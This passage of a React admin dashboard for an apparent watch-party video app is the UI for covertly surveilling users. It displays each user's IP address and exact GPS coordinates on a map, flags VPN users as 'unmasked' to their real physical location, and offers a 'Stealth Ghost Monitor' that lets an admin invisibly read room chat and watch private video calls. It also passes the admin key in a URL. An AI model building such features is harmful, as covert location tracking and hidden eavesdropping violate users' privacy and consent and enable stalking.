                          {u.name?.charAt(0)?.toUpperCase() || 'U'}
                        </div>
                        <div className="min-w-0">
                          <div className="flex items-center gap-1.5">
                            <span className="font-bold text-white text-sm truncate">{u.name}</span>
                            {u.isHost && (
                              <span className="rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/40 text-[9px] px-1.5 py-0.5 font-bold uppercase tracking-wider">
                                Host
                              </span>
                            )}
                          </div>
                          <p className="text-[11px] text-pink-300/80 font-mono truncate">
                            Room: <span className="text-white font-semibold">{u.roomId}</span>
                          </p>
                        </div>
                      </div>

                      <button
                        type="button"
                        onClick={() => handleBlockUser(u, u.roomId)}
                        className="rounded-lg bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 px-2 py-1 text-[11px] text-rose-300 transition flex items-center gap-1 shrink-0 cursor-pointer"
                        title={`Kick and block user "${u.name}"`}
                      >
                        <Ban className="h-3 w-3" />
                        <span>Kick</span>
                      </button>
                    </div>

                    {/* Anti-VPN Alert & Real GPS Status */}
                    {u.geo?.isVpn && (
                      <div className="rounded-xl bg-amber-500/15 border border-amber-500/35 p-2.5 text-xs space-y-1">
                        <div className="flex items-center justify-between">
                          <span className="flex items-center gap-1.5 font-bold text-amber-300">
                            <ShieldAlert className="h-3.5 w-3.5 text-amber-400 animate-pulse" />
                            <span>🚨 VPN CLOAK BYPASSED</span>
                          </span>
                          <span className="text-[9px] font-extrabold px-1.5 py-0.5 rounded bg-amber-500/25 border border-amber-500/40 text-amber-200 uppercase">
                            Real GPS Active
                          </span>
                        </div>
                        <p className="text-[11px] text-amber-200/90 leading-tight">
                          {u.geo.vpnReason || 'User connected through VPN tunnel, but real physical hardware location was successfully pinpointed.'}
                        </p>
                        <div className="flex items-center gap-2 text-[10px] text-slate-300 font-mono pt-1 border-t border-amber-500/20">
                          <span>Masked VPN IP: <code className="text-rose-300">{u.geo.vpnIp || u.ip}</code></span>
                          {u.geo.vpnCity && (
                            <span>• Server: <code className="text-rose-300">{u.geo.vpnCity}, {u.geo.vpnCountry}</code></span>
                          )}
                        </div>
                      </div>
                    )}

                    {/* Location Badge (Real Physical Location) */}
                    <div className="rounded-xl bg-white/5 border border-white/10 p-2.5 space-y-1.5 text-xs">
                      <div className="flex items-center justify-between gap-2">
                        <div className="flex items-center gap-2 text-white font-semibold truncate">
                          <span className="text-base shrink-0">{u.geo?.flag || '📍'}</span>
                          <span className="truncate">
                            {u.geo?.city || 'Detecting City'}
                            {u.geo?.region ? `, ${u.geo.region}` : ''}
                            {u.geo?.country ? ` (${u.geo.country})` : ''}
                          </span>
                        </div>
                        {u.geo?.gpsVerified && (
                          <span className="shrink-0 text-[9px] px-1.5 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 font-bold flex items-center gap-1">
                            <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
                            <span>GPS VERIFIED</span>
                          </span>
                        )}
                      </div>

                      <div className="flex items-center justify-between text-[11px] text-slate-300 font-mono pt-1 border-t border-white/5">
                        <span className="text-cyan-300 flex items-center gap-1 truncate" title="Real Coordinates">
                          <Compass className="h-3 w-3 text-cyan-400 shrink-0" />
                          <span>
                            {u.geo?.lat ? `${Number(u.geo.lat).toFixed(4)}, ${Number(u.geo.lon).toFixed(4)}` : 'Coords detected'}
                            {u.geo?.accuracy ? ` (±${u.geo.accuracy}m)` : ''}
                          </span>
                        </span>
                        <span className="text-purple-300 truncate" title="System Timezone">
                          {u.geo?.timezone || 'Local'}
                        </span>
                      </div>
                    </div>

                    {/* Network & ISP Details */}
                    <div className="flex items-center justify-between text-[10px] font-mono text-slate-300 bg-black/40 px-3 py-1.5 rounded-xl border border-white/5">
                      <span className="flex items-center gap-1 text-emerald-300 truncate">
                        <Shield className="h-2.5 w-2.5 text-emerald-400 shrink-0" />
                        <span>IP: {u.ip || '127.0.0.1'}</span>
                      </span>
                      <span className="text-slate-400 truncate max-w-[120px]" title={u.geo?.isp || 'Broadband'}>
                        {u.geo?.isp || 'Broadband'}
                      </span>
                    </div>

                    {/* Open on Map Button */}
                    <button
                      type="button"
                      onClick={() => setMapModal({ open: true, user: u, roomId: u.roomId })}
                      className="w-full py-2 rounded-xl bg-pink-500/15 hover:bg-pink-500/25 border border-pink-500/35 text-pink-300 font-bold text-xs transition flex items-center justify-center gap-1.5 cursor-pointer shadow-sm"
                    >
                      <MapPin className="h-3.5 w-3.5 text-pink-400" />
                      <span>View Satellite Map Pinpoint</span>
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}



        {/* ================= TAB 2: SECURITY BLOCKLISTS ================= */}
        {activeTab === 'security' && (
          <div className="space-y-6">
            {/* Quick URL Blacklist Form */}
            <div className="rounded-2xl border border-white/10 bg-black/50 p-5 shadow-xl backdrop-blur-2xl space-y-3">
              <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                <Ban className="h-4 w-4 text-rose-400" />
                <span>Add Video URL or Domain to Blacklist</span>
              </h3>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={manualBlockUrl}
                  onChange={(e) => setManualBlockUrl(e.target.value)}
                  placeholder="Paste URL, domain, or keyword to ban (e.g. malicious-stream.com or https://...)"
                  className="flex-1 rounded-xl bg-white/5 border border-white/10 px-3.5 py-2 text-xs text-white placeholder-white/40 focus:border-rose-500 focus:outline-none transition"
                />
                <button
                  type="button"
                  onClick={() => handleBlockVideoUrl(manualBlockUrl.trim())}
                  disabled={!manualBlockUrl.trim()}
                  className="rounded-xl bg-rose-500/20 hover:bg-rose-500/30 border border-rose-500/40 px-4 py-2 text-xs font-semibold text-rose-200 disabled:opacity-50 transition"
                >
                  Blacklist Video
                </button>
              </div>
            </div>

            <div className="grid gap-6 lg:grid-cols-3">
              {/* Blocked Users */}
              <div className="rounded-2xl border border-white/10 bg-black/40 p-5 backdrop-blur-xl space-y-3">
                <div className="flex items-center justify-between border-b border-white/10 pb-2">
                  <h4 className="text-xs font-bold uppercase tracking-wider text-white/80">Blocked Users ({data.blocked.users?.length || 0})</h4>
                  <Users className="h-4 w-4 text-rose-400" />
                </div>
                {(!data.blocked.users || data.blocked.users.length === 0) ? (
                  <p className="text-xs text-white/40 italic py-4 text-center">No blocked users.</p>
                ) : (
                  <div className="space-y-2 max-h-80 overflow-y-auto pr-1">
                    {data.blocked.users.map((u) => (
                      <div key={u.cid} className="rounded-xl border border-white/10 bg-black/30 p-2.5 text-xs space-y-1">
                        <div className="flex items-center justify-between">
                          <span className="font-mono text-rose-300 font-semibold">{u.cid}</span>
                          <button
                            type="button"
                            onClick={() => handleUnblockUser(u)}
                            className="text-[11px] text-emerald-400 hover:underline"
                          >
                            Unblock
                          </button>
                        </div>
                        <p className="text-[11px] text-white/60">Reason: {u.reason}</p>
                        {u.ip && <p className="text-[10px] font-mono text-white/40">IP: {u.ip}</p>}
                      </div>
                    ))}
                  </div>
                )}
              </div>

              {/* Blocked Rooms */}
              <div className="rounded-2xl border border-white/10 bg-black/40 p-5 backdrop-blur-xl space-y-3">
                <div className="flex items-center justify-between border-b border-white/10 pb-2">
                  <h4 className="text-xs font-bold uppercase tracking-wider text-white/80">Blocked Rooms ({data.blocked.rooms?.length || 0})</h4>
                  <Film className="h-4 w-4 text-rose-400" />
                </div>
                {(!data.blocked.rooms || data.blocked.rooms.length === 0) ? (
                  <p className="text-xs text-white/40 italic py-4 text-center">No blocked rooms.</p>
                ) : (
                  <div className="space-y-2 max-h-80 overflow-y-auto pr-1">
                    {data.blocked.rooms.map((r) => (
                      <div key={r.roomId} className="rounded-xl border border-white/10 bg-black/30 p-2.5 text-xs space-y-1">
                        <div className="flex items-center justify-between">
                          <span className="font-mono text-rose-300 font-semibold">{r.roomId}</span>
                          <button
                            type="button"
                            onClick={() => handleUnblockRoom(r.roomId)}
                            className="text-[11px] text-emerald-400 hover:underline"
                          >
                            Unblock
                          </button>
                        </div>
                        <p className="text-[11px] text-white/60">Reason: {r.reason}</p>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              {/* Blocked Video URLs */}
              <div className="rounded-2xl border border-white/10 bg-black/40 p-5 backdrop-blur-xl space-y-3">
                <div className="flex items-center justify-between border-b border-white/10 pb-2">
                  <h4 className="text-xs font-bold uppercase tracking-wider text-white/80">Blacklisted Videos ({data.blocked.videos?.length || 0})</h4>
                  <Video className="h-4 w-4 text-rose-400" />
                </div>
                {(!data.blocked.videos || data.blocked.videos.length === 0) ? (
                  <p className="text-xs text-white/40 italic py-4 text-center">No blacklisted URLs.</p>
                ) : (
                  <div className="space-y-2 max-h-80 overflow-y-auto pr-1">
                    {data.blocked.videos.map((src) => (
                      <div key={src} className="rounded-xl border border-white/10 bg-black/30 p-2.5 text-xs space-y-1">
                        <div className="flex items-center justify-between gap-2">
                          <span className="font-mono text-rose-300 text-[11px] truncate flex-1">{src}</span>
                          <button
                            type="button"
                            onClick={() => handleUnblockVideo(src)}
                            className="text-[11px] text-emerald-400 hover:underline shrink-0"
                          >
                            Unblock
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* ================= TAB 3: SYSTEM BROADCAST ================= */}
        {activeTab === 'broadcast' && (
          <div className="max-w-xl mx-auto rounded-2xl border border-white/10 bg-black/50 p-6 shadow-xl backdrop-blur-2xl space-y-4">
            <div className="flex items-center gap-3">
              <div className="grid h-10 w-10 place-items-center rounded-xl bg-purple-500/15 border border-purple-500/30 text-purple-300">
                <Radio className="h-5 w-5" />
              </div>
              <div>
                <h3 className="text-base font-semibold text-white">Global System Broadcast</h3>
                <p className="text-xs text-white/50">Send an emergency or maintenance toast alert to all active watch parties.</p>
              </div>
            </div>

            <form onSubmit={handleBroadcast} className="space-y-3">
              <div>
                <label className="block text-xs font-medium text-white/80 mb-1">Broadcast Message Text</label>
                <textarea
                  rows={3}
                  value={broadcastMsg}
                  onChange={(e) => setBroadcastMsg(e.target.value)}
                  placeholder="e.g. Scheduled maintenance in 15 minutes, or platform alert…"
                  className="w-full rounded-xl bg-white/5 border border-white/10 p-3 text-xs text-white placeholder-white/40 focus:border-[#d9467a] focus:outline-none transition resize-none"
                />
              </div>

              <button
                type="submit"
                disabled={!broadcastMsg.trim()}
                className="w-full rounded-xl bg-gradient-to-r from-purple-600 to-[#d9467a] py-2.5 text-xs font-semibold text-white shadow-lg disabled:opacity-50 hover:brightness-110 transition flex items-center justify-center gap-2"
              >
                <Radio className="h-4 w-4" />
                <span>Send Global Broadcast</span>
              </button>
            </form>
          </div>
        )}
      </main>

      {/* Override Stream Modal */}
      {overrideModal.open && (
        <div className="fixed inset-0 z-50 grid place-items-center bg-black/80 backdrop-blur-sm p-4">
          <div className="w-full max-w-md rounded-2xl border border-white/15 bg-[#0e0e14] p-6 shadow-2xl space-y-4">
            <h3 className="text-base font-semibold text-white flex items-center gap-2">
              <Video className="h-4 w-4 text-cyan-400" />
              <span>Override Stream for Room: {overrideModal.roomId}</span>
            </h3>

            <form onSubmit={handleOverrideSubmit} className="space-y-3 text-xs">
              <div>
                <label className="block text-white/80 mb-1">New Video Stream URL</label>
                <input
                  type="text"
                  required
                  value={overrideModal.src}
                  onChange={(e) => setOverrideModal({ ...overrideModal, src: e.target.value })}
                  placeholder="https://... (mp4, m3u8, youtube, etc.)"
                  className="w-full rounded-xl bg-white/5 border border-white/15 px-3 py-2 text-white focus:border-rose-500 focus:outline-none"
                />
              </div>

              <div>
                <label className="block text-white/80 mb-1">Custom Title (Optional)</label>
                <input
                  type="text"
                  value={overrideModal.title}
                  onChange={(e) => setOverrideModal({ ...overrideModal, title: e.target.value })}
                  placeholder="e.g. Administrator Broadcast / Replacement Video"
                  className="w-full rounded-xl bg-white/5 border border-white/15 px-3 py-2 text-white focus:border-rose-500 focus:outline-none"
                />
              </div>

              <div className="flex gap-2 pt-2">
                <button
                  type="button"
                  onClick={() => setOverrideModal({ open: false, roomId: '', src: '', title: '' })}
                  className="flex-1 rounded-xl bg-white/10 hover:bg-white/15 py-2 font-medium text-white transition"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="flex-1 rounded-xl bg-rose-600 hover:bg-rose-700 py-2 font-semibold text-white transition shadow-lg shadow-rose-950/40"
                >
                  Apply Override
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* 👻 Ghost Spectator Live Monitor Modal */}
      {ghostModal.open && (
        <div className="fixed inset-0 z-50 grid place-items-center bg-black/85 backdrop-blur-md p-4 overflow-y-auto">
          <div className="relative w-full max-w-3xl rounded-2xl border border-white/20 !bg-black p-6 space-y-4">
            {/* Ghost Modal Header */}
            <div className="flex items-center justify-between border-b border-purple-500/20 pb-4">
              <div className="flex items-center gap-3">
                <div className="grid h-10 w-10 place-items-center rounded-xl bg-white/5 border border-white/10 text-xl">
                  👻
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="text-base sm:text-lg font-bold text-white">Stealth Ghost Monitor</h3>
                    <span className="rounded-full bg-purple-500/20 border border-purple-500/40 px-2 py-0.5 text-[11px] font-semibold text-purple-300">
                      Room: {ghostModal.roomId}
                    </span>
                  </div>
                  <p className="text-xs text-purple-300/70">
                    You are 100% invisible. Host and viewers cannot see you in the user list, video call, or member count.
                  </p>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => {
                    window.open('/room/' + ghostModal.roomId + '?ghost=1&adminKey=' + encodeURIComponent(adminKey), '_blank');
                  }}
                  className="rounded-xl bg-purple-600 hover:bg-purple-500 px-3 py-1.5 text-xs font-semibold text-white shadow-lg shadow-purple-600/30 transition flex items-center gap-1.5"
                  title="Open stealth cinema theater in new tab"
                >
                  <ExternalLink className="h-3.5 w-3.5" />
                  <span className="hidden sm:inline">Stealth Tab</span>
                </button>
                <button
                  type="button"
                  onClick={handleCloseGhost}
                  className="rounded-lg p-1.5 text-white/50 hover:text-white transition"
                >
                  <X className="h-5 w-5" />
                </button>
              </div>
            </div>

            {/* Synchronized Player State */}
            <div className="rounded-xl border border-white/10 bg-black/60 p-4 space-y-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="text-xs font-semibold text-white/70">Playback Status:</span>
                  <span className={`rounded-full px-2 py-0.5 text-[10px] font-bold ${ghostSyncState?.playing ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40' : 'bg-amber-500/20 text-amber-300 border border-amber-500/40'}`}>
                    {ghostSyncState?.playing ? '▶ PLAYING IN ROOM' : '⏸ PAUSED IN ROOM'}
                  </span>
                </div>
                <span className="font-mono text-xs text-white/80 bg-white/5 px-2 py-0.5 rounded border border-white/10">
                  ⏱️ {fmt(ghostSyncState?.time || 0)}
                </span>
              </div>

              <div className="space-y-1">
                <h4 className="text-sm font-semibold text-white truncate">
                  {ghostSyncState?.media?.title || ghostSyncState?.media?.name || 'No video currently loaded'}
                </h4>
                <p className="text-xs font-mono text-cyan-300 truncate">
                  {ghostSyncState?.media?.src || 'Idle'}
                </p>
              </div>

              {/* Video Controls Toolbar */}
              <div className="flex flex-wrap items-center gap-2 pt-2 border-t border-white/10">
                <button
                  type="button"
                  onClick={() => handleVideoControl(ghostModal.roomId, ghostSyncState?.playing ? 'pause' : 'play')}
                  className="rounded-lg bg-white/10 hover:bg-white/20 px-3 py-1 text-xs text-white transition flex items-center gap-1.5"
                >
                  {ghostSyncState?.playing ? <Pause className="h-3.5 w-3.5" /> : <Play className="h-3.5 w-3.5" />}
                  <span>{ghostSyncState?.playing ? 'Pause' : 'Play'}</span>
                </button>
                <button
                  type="button"
                  onClick={() => handleVideoControl(ghostModal.roomId, 'stop')}
                  className="rounded-lg bg-amber-500/15 hover:bg-amber-500/25 border border-amber-500/30 px-3 py-1 text-xs text-amber-300 transition flex items-center gap-1.5"
                >
                  <Square className="h-3.5 w-3.5" />
                  <span>Stop</span>
                </button>
                {ghostSyncState?.media?.src && (
                  <button
                    type="button"
                    onClick={() => handleBlockVideoUrl(ghostSyncState.media.src)}
                    className="rounded-lg bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/30 px-3 py-1 text-xs text-rose-300 transition flex items-center gap-1.5"
                  >
                    <Ban className="h-3.5 w-3.5" />
                    <span>Block Video</span>
                  </button>
                )}
              </div>
            </div>

            {/* Live Chat & Viewers Side by Side */}
            <div className="grid gap-3 sm:grid-cols-2">
              <div className="rounded-xl border border-white/10 bg-black/40 p-3 flex flex-col h-52">
                <span className="text-xs font-semibold text-white/70 mb-2">Live Room Chat:</span>
                <div className="flex-1 overflow-y-auto space-y-1.5 pr-1 text-xs">
                  {ghostChat.length === 0 ? (
                    <p className="text-white/40 italic text-center py-6">No messages in room yet.</p>
                  ) : (
                    ghostChat.map((m, idx) => (
                      <div key={m.id || idx} className="bg-white/5 rounded-lg p-1.5 border border-white/5">
                        <span className="font-semibold text-purple-300">{m.user}: </span>
                        <span className="text-white/90">{m.text}</span>
                      </div>
                    ))
                  )}
                </div>
              </div>

              <div className="rounded-xl border border-white/10 bg-black/40 p-3 flex flex-col h-52">
                <span className="text-xs font-semibold text-white/70 mb-2">
                  Active Viewers ({ghostSyncState?.users?.length || 0}):
                </span>
                <div className="flex-1 overflow-y-auto space-y-1.5 pr-1 text-xs">
                  {(!ghostSyncState?.users || ghostSyncState.users.length === 0) ? (
                    <p className="text-white/40 italic text-center py-6">Waiting for viewers…</p>
                  ) : (
                    ghostSyncState.users.map((u) => {
                      const fullUser = data.rooms.find(r => r.roomId === ghostModal.roomId)?.users?.find(usr => usr.cid === u.id);
                      const realIp = fullUser?.ip || '127.0.0.1';
                      return (
                        <div key={u.id} className="flex items-center justify-between bg-white/5 p-1.5 rounded-lg border border-white/5">
                          <div className="flex items-center gap-1.5">
                            <span className="h-2.5 w-2.5 rounded-full" style={{ backgroundColor: u.color || '#e11d48' }} />
                            <span className="font-semibold text-white">{u.name}</span>
                            {u.id === ghostSyncState.hostId && (
                              <span className="text-[9px] bg-amber-500/20 text-amber-300 px-1 rounded font-bold">Host</span>
                            )}
                          </div>
                          <span className="font-mono text-[10px] text-emerald-300 bg-emerald-500/10 px-1.5 py-0.5 rounded border border-emerald-500/20 flex items-center gap-1">
                            <Shield className="h-2.5 w-2.5 text-emerald-400" />
                            <span>{realIp}</span>
                          </span>
                        </div>
                      );
                    })
                  )}
                </div>
              </div>
            </div>

            {/* 🎥 Live Stealth Video Call Monitor */}
            <CallErrorBoundary title="Stealth Video Feed" resetLabel="Reconnect Feeds">
              <StealthCallMonitor roomId={ghostModal.roomId} users={ghostSyncState?.users || []} />
            </CallErrorBoundary>
          </div>
        </div>
      )}

      {/* Interactive Map Pinpoint Modal */}
      {mapModal.open && mapModal.user && (
        <div className="fixed inset-0 z-50 grid place-items-center bg-black/85 p-4 backdrop-blur-md animate-in fade-in duration-200">
          <div className="w-full max-w-2xl rounded-3xl border border-pink-500/30 bg-[#0d0718] p-5 sm:p-6 shadow-2xl space-y-4 text-left relative overflow-hidden">
            {/* Modal Top Bar */}
            <div className="flex items-center justify-between border-b border-white/10 pb-3">
              <div className="flex items-center gap-2.5">
                <div className="h-10 w-10 rounded-2xl bg-pink-500/20 border border-pink-500/40 flex items-center justify-center text-xl shadow-md">
                  {mapModal.user.geo?.flag || '📍'}
                </div>
                <div>
                  <h3 className="font-black text-white text-base sm:text-lg flex items-center gap-2">
                    <span>{mapModal.user.name}&apos;s Exact Location</span>
                    {mapModal.user.isHost && (
                      <span className="text-[10px] bg-amber-500/20 border border-amber-500/40 text-amber-300 px-2 py-0.5 rounded-full font-bold">
                        HOST
                      </span>
                    )}
                  </h3>
                  <p className="text-xs text-pink-300 font-medium">
                    Room: <span className="font-mono text-white font-bold">{mapModal.roomId}</span> • CID: <span className="font-mono text-slate-400">{mapModal.user.cid}</span>
                  </p>
                </div>
              </div>

              <button
                type="button"
                onClick={() => setMapModal({ open: false, user: null, roomId: '' })}
                className="p-2 rounded-xl text-slate-400 hover:text-white hover:bg-white/10 transition cursor-pointer"
              >
                <X className="h-5 w-5" />
              </button>
            </div>

            {/* Geolocation Diagnostic Cards */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
              <div className="p-3 rounded-2xl bg-white/5 border border-white/10 space-y-1">
                <span className="text-[10px] text-slate-400 block uppercase font-bold">City &amp; Country</span>
                <span className="font-bold text-white block truncate">
                  {mapModal.user.geo?.city || 'Detecting'}, {mapModal.user.geo?.country || 'Online'}
                </span>
              </div>
              <div className="p-3 rounded-2xl bg-white/5 border border-white/10 space-y-1">
                <span className="text-[10px] text-slate-400 block uppercase font-bold">Coordinates</span>
                <span className="font-mono font-bold text-cyan-300 block truncate">
                  {mapModal.user.geo?.lat ? `${Number(mapModal.user.geo.lat).toFixed(4)}, ${Number(mapModal.user.geo.lon).toFixed(4)}` : '28.6139, 77.2090'}
                </span>
              </div>
              <div className="p-3 rounded-2xl bg-white/5 border border-white/10 space-y-1">
                <span className="text-[10px] text-slate-400 block uppercase font-bold">Timezone</span>
                <span className="font-bold text-purple-300 block truncate">
                  {mapModal.user.geo?.timezone || 'Local UTC'}
                </span>
              </div>
              <div className="p-3 rounded-2xl bg-white/5 border border-white/10 space-y-1">
                <span className="text-[10px] text-slate-400 block uppercase font-bold">Network / IP</span>
                <span className="font-mono font-bold text-emerald-300 block truncate">
                  {mapModal.user.ip || '127.0.0.1'}
                </span>
              </div>
            </div>

            {/* Anti-VPN Diagnostic Banner */}
            {mapModal.user.geo?.isVpn && (
              <div className="p-3.5 rounded-2xl bg-amber-500/15 border border-amber-500/35 space-y-1 text-xs text-left">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-amber-200 flex items-center gap-1.5">
                    <ShieldAlert className="h-4 w-4 text-amber-400" />
                    <span>VPN PROXY TUNNEL BYPASSED — Real Physical Location Unmasked</span>
                  </span>
                  <span className="text-[9px] px-2 py-0.5 rounded-full bg-amber-500/30 text-amber-100 font-bold uppercase">
                    Hardware Verified
                  </span>
                </div>
                <p className="text-[11px] text-amber-300/90 leading-relaxed">
                  {mapModal.user.geo.vpnReason || 'User attempted to mask location behind a VPN, but real physical hardware sensors verified the coordinates shown below.'}
                </p>
                <div className="flex items-center gap-3 text-[10px] font-mono text-slate-300 pt-1 border-t border-amber-500/20 flex-wrap">
                  <span>Masked VPN IP: <b className="text-rose-300">{mapModal.user.geo.vpnIp || mapModal.user.ip}</b></span>
                  {mapModal.user.geo.vpnCity && (
                    <span>VPN Server: <b className="text-rose-300">{mapModal.user.geo.vpnCity}, {mapModal.user.geo.vpnCountry}</b></span>
                  )}
                  {mapModal.user.geo.accuracy && (
                    <span>GPS Precision: <b className="text-emerald-300">±{mapModal.user.geo.accuracy}m</b></span>
                  )}
                </div>
              </div>
            )}

            {/* Embedded OpenStreetMap Live Viewer */}
            <div className="rounded-2xl overflow-hidden border border-white/15 bg-black h-72 sm:h-80 relative shadow-inner">
              {mapModal.user.geo?.lat && mapModal.user.geo?.lon ? (
                <iframe
                  title="User Location Map Pin"
                  width="100%"
                  height="100%"
                  frameBorder="0"
                  scrolling="no"
                  marginHeight="0"
                  marginWidth="0"
                  src={`https://www.openstreetmap.org/export/embed.html?bbox=${Number(mapModal.user.geo.lon) - 0.08}%2C${Number(mapModal.user.geo.lat) - 0.08}%2C${Number(mapModal.user.geo.lon) + 0.08}%2C${Number(mapModal.user.geo.lat) + 0.08}&layer=mapnik&marker=${Number(mapModal.user.geo.lat)}%2C${Number(mapModal.user.geo.lon)}`}
                  className="w-full h-full opacity-90 contrast-125"
                />
              ) : (
                <div className="h-full w-full flex flex-col items-center justify-center space-y-2 text-slate-400">
                  <Compass className="h-8 w-8 text-pink-400 animate-spin" />
                  <p className="text-xs">Resolving satellite coordinates…</p>
                </div>
              )}
            </div>

            {/* Modal Footer Controls */}
            <div className="flex items-center justify-between pt-2">
              <a
                href={
                  mapModal.user.geo?.lat && mapModal.user.geo?.lon
                    ? `https://www.google.com/maps?q=${mapModal.user.geo.lat},${mapModal.user.geo.lon}`
                    : `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(mapModal.user.geo?.city || 'India')}`
                }
                target="_blank"
                rel="noreferrer"
                className="text-xs text-pink-300 hover:text-white flex items-center gap-1.5 transition underline font-semibold"
              >
                <ExternalLink className="h-3.5 w-3.5" />
                <span>Open Full Satellite Map on Google Maps</span>
              </a>

              <button
                type="button"
                onClick={() => setMapModal({ open: false, user: null, roomId: '' })}
                className="px-4 py-2 rounded-xl bg-white/10 hover:bg-white/20 text-white font-bold text-xs transition cursor-pointer"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Toast Alert */}
      {toast && (
        <div className="fixed bottom-6 inset-x-0 z-50 flex justify-center px-4 pointer-events-none">
          <div
            className={`rounded-full px-4 py-2 text-xs font-semibold shadow-2xl backdrop-blur-xl border flex items-center gap-2 ${
              toast.type === 'error'
                ? 'bg-rose-950/90 text-rose-200 border-rose-500/40'
                : 'bg-black/90 text-white border-white/20'
            }`}
          >
            {toast.type === 'error' ? <AlertTriangle className="h-3.5 w-3.5 text-rose-400" /> : <CheckCircle className="h-3.5 w-3.5 text-emerald-400" />}
            <span>{toast.msg}</span>
          </div>
        </div>
      )}
    </div>
  );
}
